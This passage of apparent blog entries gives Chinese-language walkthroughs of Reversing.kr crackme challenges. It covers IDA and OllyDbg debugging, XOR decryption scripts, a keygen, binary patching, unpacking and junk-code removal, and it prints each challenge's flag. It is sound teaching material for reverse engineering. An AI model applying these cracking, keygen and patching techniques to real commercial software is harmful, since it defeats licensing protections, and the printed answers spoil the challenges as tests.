<p>双击 byte_B67028 ，其中所存储的应该就是加密后的 flag ，我们可以通过交叉引用来看看 flag 是如何解密的：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-7.png"
                      alt="image"
                ></p>
<p>交叉引用到了函数 sub_B63400 ，在这里可以清楚的发现，flag 与 byte_B69184[132 * result * 4] 进行的异或，我们可能会想到去跟踪一下这里的值是什么，但是在静态分析时，这里是没有内容的，只有当程序运行起来之后才会动态的向这里添加内容。<br>涉及到一个新的知识点–使用 IDA 对程序进行动态调试，其实在 IDA 中调试和使用 OD 类似，只不过有些操作可能没有 OD 使用起来顺手，但是 IDA 能做到一些 OD 很难实现的操作，首先需要去微软下载 Windbg，然后在上方的工具栏中选中 Windbg 调试器：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-8.png"
                      alt="image"
                ></p>
<p>就可以按绿色三角按钮开始调试了(可能在设置过程中遇到一些问题，百度上有很详细的教程)。在调试之前先下一个断点(可以在判断 hp 附近下断，但是不要太靠前，要保证程序启动起来)，当程序断下后，我们可以选择手动去将需要的值一个一个的找到，但是这样效率太低，而且每个人都不会乐意这样做，强大的 IDA 为我们提供了一件神器：IDC(或更方便的 IDA-Python)，它就在 IDA 界面的最下方：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-9.png"
                      alt="image"
                ></p>
<p>它的用途非常广泛，如果能熟练使用，将大大降低逆向的工作量。<br>这里使用一个 IDA-Python 脚本将目标值打印出来：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b = 0x3F9184</span><br><span class="line">for i in range(50):</span><br><span class="line">    print(Byte(b + i * 4 * 132),)</span><br></pre></td></tr></table></figure></div>
<p>在控制台看到以下输出(数据过多截一部分)：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-10.png"
                      alt="image"
                ></p>
<p>不难发现，目标值都是 4 的倍数，那么解密 flag 的算法也非常简单了：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">s = [67, 107, 102, 107,  98, 117, 108, 105,  76,  69, </span><br><span class="line">   92,  69,  95,  90,  70,  28,   7,  37,  37,  41, </span><br><span class="line">  112,  23,  52,  57,   1,  22,  73,  76,  32,  21, </span><br><span class="line">   11,  15, 247, 235, 250, 232, 176, 253, 235, 188, </span><br><span class="line">  244, 204, 218, 159, 245, 240, 232, 206, 240, 169]</span><br><span class="line">for i in range(50):</span><br><span class="line">    print(chr(s[i] ^ (i * 4)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></div>
<p>运行即可得到flag</p>
<p>flag： <strong>Congratulation~ Game Clear! Password is Thr3EDPr0m</strong></p>
<h2 id="09-Ransomware"><a href="#09-Ransomware" class="headerlink" title="09 Ransomware"></a>09 Ransomware</h2><p>题目名字叫做勒索，解压压缩包后得到三个文件，阅读提示发现，名为 file 的文件可能被加密了，并且加密程序为 run.exe，尝试打开 run.exe，发现输出了一堆乱码，然后显示如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-1.png"
                      alt="image"
                ></p>
<p>网站是韩国人搭建的，那么这里的乱码应该也是韩文，就算不是乱码也看不懂，所以影响不大。<br>这里的逻辑应该就是，我们输入某一个密码，然后此程序就会将加密的文件解密，所以加密算法应该是可逆的。<br>在使用 PEID 查壳时发现，程序加了 UPX 的壳，使用脱壳机无效，那么直接手脱，得到正常程序：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-2.png"
                      alt="image"
                ></p>
<p>看到这个大小就觉得这个题目不简单，要知道源程序是仅有 10kb 左右的，尝试使用 IDA 打开脱壳后的文件，发现需要解析很长时间，而且满眼都是以下代码，它们没有任何实质性的作用：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-3.png"
                      alt="image"
                ></p>
<p>在主函数的最下方终于找到了正常的代码，但是发现其中多次调用函数 sub_401000 ，这个函数中完全是由那些垃圾代码构成的，尝试使用 F5 IDA无法反编译。<br>其实这些代码成为花代码，是程序开发者为了增加逆向分析的成本，保护软件而添加的垃圾代码，它们通常没有任何实质性的作用，一般会严重影响逆向分析软件的工作。想要继续分析此题，可以直接看汇编，但既然有 F5 的希望，那么我们自然要想办法去使用 F5 了，这里就涉及到指令去花，通过观察发现，本程序中的花代码是由相同的 7 条指令构成的，在十六进制窗口中能够找到它们：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-4.png"
                      alt="image"
                ></p>
<p>有一串十六进制一直在重复： “<strong>6061905058535B</strong>“<br>这就是花代码，我们先编写一个简单的脚本将程序中所有这样的字节全部替换为 0x90(即 nop)：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data = open(&#x27;dumped_.exe&#x27;,&#x27;rb&#x27;).read() </span><br><span class="line">data = data.replace(&#x27;\x60\x61\x90\x50\x58\x53\x5b&#x27;,&#x27;\x90\x90\x90\x90\x90\x90\x90&#x27;) </span><br><span class="line">open(&#x27;fixed.exe&#x27;,&#x27;wb&#x27;).write(data)</span><br></pre></td></tr></table></figure></div>
<p>再次使用 IDA 打开清洗后的程序，会发现花代码已经全部消失了：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-5.png"
                      alt="image"
                ></p>
<p>这时再次使用 F5 尝试反编译，发现 IDA 还是报出错误，提示我们函数过大，这里修改 IDA 的配置文件即可，打开你的 IDA 安装目录，找到 cfg 文件夹下的 hexrays.cfg ，在这个文件中的第 40 行(IDA 7.0)：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-6.png"
                      alt="image"
                ></p>
<p>将此项修改为 1024 ，重启 IDA 即可反编译代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-7.png"
                      alt="image"
                ></p>
<p>然后逐步去分析程序逻辑，发现加密算法从第 44 行开始：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-8.png"
                      alt="image"
                ></p>
<p>将秘钥和文件逐字节先异或然后取反，两个操作都是可逆的，看到这里算法和被加密的文件都有了，但是秘钥未知，目标文件是什么也不清楚(其实就在提示里面)，想了好久不知道下一步该干什么，百度到了几篇大佬的 WP ，原来 file 文件是一个 EXE ，提示中也告诉了我们这一点。。。</p>
<p>参考 WP ，由于 exe 文件中有一段比较特殊的语句：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-9.png"
                      alt="image"
                ><br>所以可以根据这句话来暴力破解出秘钥(或者根据文件末尾的 0x00)，这里直接贴上大佬的脚本：<br><a class="link"   href="https://blog.csdn.net/whklhhhh/article/details/78137138" >参考WP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C, 0x8C, 0x93, 0x9A, 0x8B, 0x8C, 0x8F, 0x93, 0x9E, 0x86, 0x9C, 0x97, 0x9A, 0x8C]</span><br><span class="line">for i in s:</span><br><span class="line">    print(chr((~i ^ 0)%256), end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure></div>
<p>得到秘钥的循环：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-10.png"
                      alt="image"
                ></p>
<p>取出其中有意义的语句即：<strong>letsplaychess</strong>，尝试使用这个密码进行解密，得到了一个 EXE 文件，运行即得 flag：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr9-11.png"
                      alt="image"
                ></p>
<p>flag： <strong>Colle System</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Reversing.kr 4 5</title>
    <url>/2018/09/04/reversingkr4-5/</url>
    <content><![CDATA[<p>Reversing.kr 上面的题目。</p>
<span id="more"></span>

<h2 id="04-Music-Player"><a href="#04-Music-Player" class="headerlink" title="04 Music Player"></a>04 Music Player</h2><p>第四题增加了一些难度，打开文件，是一个简单的音乐播放器，但是载入的歌曲最多只能播放1分钟，根据题目提示，如果能够使它播放超过一分钟，就能看到flag。  </p>
<p>程序没有加壳，直接丢进IDA看会发现代码非常混乱，有很多未解析的代码，如果你使用PEID等工具检查了程序的话就会发现，程序使用VB编写，VB有两种编译模式，第一个叫做 P-Code(伪代码编译)，另一种则是正常的本机代码编译，P-Code 模式会将代码编译为VB特有的伪代码形式，由 VB 的虚拟机运行，不巧的是，微软并没有公开这个虚拟机的信息，但是还是有逆向方法的，只不过需要注意一些细节，OD可以正常使用，但是在修改机器码的时候就需要特别注意了。通过使用VB专用的逆向工具也能得到一些有用的信息，比如使用 VBExplore 打开这个程序：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-1.png"
                      alt="image"
                ></p>
<p>大致浏览各个控件，再运行程序，可以一一对应，其中还有两个计时器，不过没有代码对照，可能无法得知它们的用途。<br>直接祭出 OD，开始调试程序。  </p>
<p><strong>注意：还有一款实用软件 VB Decompiler，它可以反汇编以及反编译VB程序，对于这种P-CODE还是能够处理出一些有用的信息，但是代码比较难看，这里不以它为参考。</strong></p>
<p>首先要了解逆向 VB 的一些基本技巧，由于这是一个GUI程序，所以想要定位关键代码，一定要了解一些VB的API，比如负责弹出窗口的 <strong>rtcMsgBox</strong> 或者 <strong>__vbaNew2</strong>，以及操作字符串的一些函数，这些都是破解中较为常用的，强大的 OD 已经集成了一些插件，可以让我们直接在这些系统函数中下断(打开OD后上面的灰色工具条中，点击VB)：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-2.png"
                      alt="image"
                ></p>
<p>这里能看到很多实用的断点工具，本题主要使用第一项（因为在播放满一分钟时会弹出一个窗口），点击后再打开断点窗口，能看到新增加了一个断点:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-3.png"
                      alt="image"
                ></p>
<p>这个断点就在 rtcMsgBox 了，以后程序的运行过程中，如果再次调用到了这个函数，调试器就会断在这里，方便我们进行回溯。<br>然后F9运行程序，打开一个MP3文件(大于1分钟)，点击播放按钮开始播放，等播放到1分钟(可以直接拖动进度条)，如果不出意外 OD 会触发之前下的断点：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-4.png"
                      alt="image"
                ></p>
<p>这时观察栈中的数据，根据函数调用约定，这时栈顶的内容就是调用者的地址：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-5.png"
                      alt="image"
                ></p>
<p>有些情况下栈顶可能并不是调用者的地址，这时可以点击上方工具栏中的 “k” 按钮，显示调用堆栈：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-6.png"
                      alt="image"
                ><br>这里也能看到调用者的信息。<br>双击调用者的地址，在反汇编窗口中转到关键函数，这时有两种办法，其一就是定位到函数开头(push ebp、mov ebp,esp …)下断点，然后单步弄清程序逻辑，另一种的思路是：由于我们已经找到关键函数的地址，所以可以在IDA中找到对应位置，然后尝试反编译出伪代码以减少工作量。<br>我们直接使用IDA载入，找到地址为 <strong>0x004044C0</strong> 的位置，在这个地址上按下 P 键，再使用 F5 就可以看到伪代码了。<br>函数很长，截一部分：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-7.png"
                      alt="image"
                ></p>
<p>很容易就能够想到，变量 v35 所存储的应该就是已经播放的时间，依据就是代码将 v35 与 60000 以及下面的 60010 进行比较，在 VB 中，计时器有关的时间(秒数)会放大 1000 倍，这里的 60000 所对应的应该就是 60 秒了。<br>对照着伪代码，整理出程序的逻辑，不停地(应该是1秒一次，可以在 VBExplore 中看计时器的属性)将已经播放的时间和 60000 比较，如果小于就执行一些操作，如果大于或等于，就弹窗。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-8.png"
                      alt="image"
                ></p>
<p>当时间没有超过 60 秒时，有一处判断：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-9.png"
                      alt="image"
                ></p>
<p>如果运行到这里，应该就会拿到 flag 了，那么直接暴力一波，在 OD 中做如下修改：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-10.png"
                      alt="image"
                ><br>改为：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-11.png"
                      alt="image"
                ></p>
<p>再次运行程序(提示：<strong>可以将修改保存到程序，方便操作</strong>)，当播放到1分钟时，会弹出这样的对话框：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-12.png"
                      alt="image"
                ></p>
<p>音频还在继续播放，但是点击确定之后程序会退出，而且也没有 flag 出来，百度一下可以找到关于这个错误的信息，一般是控件的属性设置出错导致的，也许你想尝试捕获这个对话框，但是无论断 rtcMsgBox 还是 __vbaNew2 都没有用处，OD 没有捕获到这两个断点，仔细思考一下，对话框弹出后音频却没有间断，那么显然这个对话框控制权并不在本程序，而是在其他位置，其实，这是一个系统所抛出的异常，它位于 kernel32.dll 中，想要捕获到这个窗口，需要了解一下 windows 异常处理机制(这里不详细介绍)，我们可以在系统函数 <strong>RaiseException</strong> 下断点，利用命令 <strong>bp RaiseException</strong> 即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-13.png"
                      alt="image"
                ></p>
<p>在断点窗口中看到新的断点位于 kernel32.dll 中，下好断点 F9 开始执行程序，当播放时间满 1 分钟时，会断在这个断点，打开调用堆栈窗口，就能找到程序中调用者的信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-14.png"
                      alt="image"
                ></p>
<p>定位到这块代码，找到了触发异常的函数 <strong>__vbaHresultCheckObj</strong> ，关于这个函数的具体信息可以在百度上找到，它的用途是检查某个对象(应该是VB的特有函数？)，我们之前的修改可能造成了某个对象的属性出错，使得这个函数不能正常工作，但是这个函数上方正好有一处跳转：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-15.png"
                      alt="image"
                ></p>
<p>可以将它改为无条件跳转(原来为 大于或等于 则跳转)： <strong>jmp short 004046BF</strong><br>然后将修改保存到文件，再次运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-16.png"
                      alt="image"
                ></p>
<p>顺利拿到 flag ： <strong>LIstenCare</strong></p>
<h2 id="05-Replace"><a href="#05-Replace" class="headerlink" title="05 Replace"></a>05 Replace</h2><p>第五题是一道经典的 输入-验证 类型题目，打开程序，要求输入一些内容，然后进行 check，随便输入一些内容(<strong>输入的时候发现，只能输入数字</strong>)：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-1.png"
                      alt="image"
                ><br>程序直接崩溃了，这个验证的过程应该不会很简单，我们直接使用IDA打开程序，通过搜索字符串的方式定位关键函数，直接定位到了函数 <strong>DialogFunc</strong>，反编译后查看伪代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-2.png"
                      alt="image"
                ></p>
<p>代码比较奇怪，反编译的似乎不太正确，很多函数无法反编译，而且 IDA 也提示我们输出的结果可能是错误的，静态分析暂时没有什么好办法，那么打开 OD 尝试动态分析。<br>依旧是先在关键函数下断点(我们在 <strong>GetDlgItemInt</strong> 上面下断)，然后 F9 运行程序，在随意输入一些数字后，点击check按钮，程序触发断点：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-3.png"
                      alt="image"
                ></p>
<p>步过这个系统函数之后发现 EAX 中存储的值为我们输入数字的十六进制，例如输入 12345，EAX中的值就是 0x3039。</p>
<p>单步程序，当单步跟踪到这里：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-4.png"
                      alt="image"
                ></p>
<p>有一句奇怪的指令 db 81 ，查询 INTEL 手册并没有发现 0x81 对应着什么指令，猜测这个字节是多余的，右键这句代码 –&gt; 分析 –&gt; 从模块删除分析：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-5.png"
                      alt="image"
                ></p>
<p>代码就会变成这样，看上去比原来好一些(下面的 pushad 以及 popad 相当于没有执行任何操作)：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-6.png"
                      alt="image"
                ></p>
<p>通过单步整理逻辑，0x4084D0 中存储的是我们输入的数字 + 2，这里再加上 0x601605C7 ，继续单步，又加了2，那么最后 0x4084D0 中所存储的就是 <strong>输入 + 4 + 0x601605C7</strong>。<br>随后程序执行到了这里：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-7.png"
                      alt="image"
                ></p>
<p>两条 JMP ，紧跟的就是字符串 correct ，这种情况下，如果没有另一处跳转能够直接转到 0x401073 的话，是永远不可能出现 correct 提示的，接着单步程序，来到这段代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-8.png"
                      alt="image"
                ></p>
<p>动态在 0x40466F 生成了一条代码，并将执行流切换到那里(期间还会对 0x4084D0 进行几次自增，但是在自增前已经将其中的值取出到 EAX 中了，所以并不干扰计算)。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-9.png"
                      alt="image"
                ></p>
<p>将 0x90 赋值给 EAX 对应的地址，而此时 EAX 中的值就是上面经过处理的输入，根据 INTEL 手册，0X90 所对应的指令为 nop ，思路比较明显，如果能使这里的 EAX 的值为 <strong>0x401071</strong> ，那么就能将那两条 JMP 中的第二条去掉，从而使程序输出 correct。<br>不过我们的输入会经过加法处理，经过处理的数据已经很大了，并不能达到目标地址，这里利用整数溢出，输入一个很大的整数，使执行加法的时候产生溢出，达到理想的地址。<br>于是我们需要满足算式： <strong>input + 0x601605C7 + 4 &#x3D; 0x401071</strong><br>使用计算器计算：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-10.png"
                      alt="image"
                ></p>
<p>由于是 INT 型数据，所以只取后4个字节 即 0xA02A0AA6,转换成十进制就是 2687109798，输入程序：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-11.png"
                      alt="image"
                ></p>
<p>flag：<strong>2687109798</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Reversing.kr 1-3</title>
    <url>/2018/09/02/reversingkr1-3/</url>
    <content><![CDATA[<p>Reversing.kr 上面的题目。</p>
<span id="more"></span>

<h2 id="01-Easy-Crack"><a href="#01-Easy-Crack" class="headerlink" title="01 Easy Crack"></a>01 Easy Crack</h2><p>基础题，不需要动态分析，直接丢到IDA中，Shift+F12搜索字符串，发现有 “Congratulation !!” 以及 “Incorrect Password” 的字样，定位到相关函数，就能看到处理逻辑：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-1.png"
                      alt="image"
                ></p>
<p>读取输入直接和硬编码的flag进行比较，唯一的坑点在于比较的顺序，细心观察发现，变量v3 v4 v5 以及string 其实应该是一个数组，但是IDA错误的将其解析为了char型变量，我们<strong>单机string，并按下Y键</strong>，修改变量类型：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-2.png"
                      alt="image"
                ></p>
<p>再来看就清晰多了：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-3.png"
                      alt="image"
                ></p>
<p>那么flag就是： <strong>Ea5yR3versing</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-4.png"
                      alt="image"
                ></p>
<p>测试成功。</p>
<h2 id="02-Easy-Keygen"><a href="#02-Easy-Keygen" class="headerlink" title="02 Easy Keygen"></a>02 Easy Keygen</h2><p>简单的注册机编写，依旧无需动态调试，直接丢到IDA中看，老方法，将主函数的变量进行修复：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-1.png"
                      alt="image"
                ></p>
<p>根据逻辑整理出注册机：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python2.7</span><br><span class="line">from __future__ import print_function</span><br><span class="line">name = raw_input(&quot;please input a name:&quot;)</span><br><span class="line">token = [0x10,0x20,0x30]</span><br><span class="line">index = 0</span><br><span class="line">for i in name:</span><br><span class="line">    if index &gt;= 3:</span><br><span class="line">        index = 0</span><br><span class="line">    print(&quot;%02X&quot; % (ord(i) ^ token[index]) ,end=&quot;&quot;)</span><br><span class="line">    index += 1</span><br></pre></td></tr></table></figure></div>
<p>运行代码就能计算任意用户名的注册码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-2.png"
                      alt="image"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-3.png"
                      alt="image"
                ></p>
<p>但是题目要求我们找到注册码为 **“5B134977135E7D13” **的用户名，暴力破解即可。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x10 == 0x5B:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x20 == 0x13:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x30 == 0x49:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x10 == 0x77:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x20 == 0x13:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x30 == 0x5E:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x10 == 0x7D:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x20 == 0x13:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br></pre></td></tr></table></figure></div>
<p>flag： <strong>K3yg3nm3</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-4.png"
                      alt="image"
                ></p>
<h1 id="03-Easy-Unpack"><a href="#03-Easy-Unpack" class="headerlink" title="03 Easy Unpack"></a>03 Easy Unpack</h1><p>第三题稍微增加了一些难度，是一道加了壳的题目，要求找到程序的OEP(原始入口点)，IDA直接打开会报这个错误：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-1.png"
                      alt="image"
                ></p>
<p>提示我们程序可能被加壳或修改，这时，常规的操作就不够了，我们掏出 PEID来查一下程序可能加了什么壳：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-2.png"
                      alt="image"
                ></p>
<p>很遗憾，程序所加的壳并不是已知的壳，但是这不妨碍我们去尝试脱壳，OD载入程序，这里采用 “单步跟踪法” 进行脱壳(详细请百度了解)，遇到向上的跳转就使用F4运行到下一句代码，直到找到一个长跳转(或称远跳转)，基本就找到了OEP：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-3.png"
                      alt="image"
                ></p>
<p>在这里可以看到很明显的长跳转，那么 OEP 可能就是 <strong>00401150</strong><br>尝试提交，结果正确。</p>
<p>拓展：<strong>尝试脱掉这个未知的壳。</strong>  </p>
<p><em>请在WIN XP 或者 WIN 7 脱壳</em></p>
<p>由于这个壳看上去并不复杂，应该可以脱掉，按照以下步骤操作：  </p>
<ol>
<li>在OD中运行到 OEP 处。</li>
<li>打开 LordPE ，尝试转储程序镜像：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-4.png"
                      alt="image"
                ><br>注意，<strong>要先修正镜像大小！</strong>即使有些时候修复前后的程序并没有变化。</li>
<li>打开 Import REC ,尝试修复程序的 IAT：</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-5.png"
                      alt="image"
                ><br>这里要附加到还在OD中处于调试状态的目标程序，然后手动修正OEP。<br>  <strong>注意：不能直接填写OEP，如 00401150，而是要将OEP减去 00400000(一般来说)，因为这里需要填写的其实是 RVA，但是OD中看到的是 VA，RVA即 相对虚拟地址，VA即虚拟地址，他们与PE结构有关，有兴趣可以详细了解。</strong><br>再点击IAT自动搜索，就能够找到程序调用的DLL，一般情况下是需要将无效指针(图中显示<strong>否</strong>的)删除或手动修复，但是本例中观察无效指针发现，它们都是真实存在的，所以不需要进行多余操作，直接修正转储即可，在导出文件时选择第二步 dump 下来的文件，就能得到脱掉了壳的程序啦。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-7.png"
                      alt="image"
                ></p>
<p>程序可以正常运行，再次使用IDA打开，也没有加壳提示了，相关的函数也成功修复：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-6.png"
                      alt="image"
                ></p>
<p>想要详细了解如何脱壳可以自行百度。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
</search>
